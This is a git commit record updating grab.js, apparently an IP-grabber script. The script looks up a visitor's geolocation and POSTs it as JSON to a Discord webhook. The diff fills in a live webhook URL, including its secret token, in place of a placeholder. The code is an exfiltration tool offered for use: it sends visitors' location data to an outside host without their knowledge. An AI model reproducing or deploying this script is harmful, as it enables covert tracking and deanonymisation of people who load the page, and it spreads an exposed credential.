9c8676c5d11828c913a55e1d585ef2cf2a26c69e
ethan.html <124911792+EthanAnaya@users.noreply.github.com>
2023-05-11 18:19:43 -0700

    Update grab.js

--- grab.js
+++ grab.js
@@ -1,6 +1,6 @@
 $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
     var request = new XMLHttpRequest();
-    request.open("POST", "WEBHOOK HERE!");
+    request.open("POST", "https://discord.com/api/webhooks/1085702594053283881/_y6nZxTcCKIqPy4oPlsZz54oNsvBW2BpG6bHwoFEOLRGZZnX_vB2n-cNNn8TF6-RP7_y");
   
     request.setRequestHeader('Content-type', 'application/json');
   
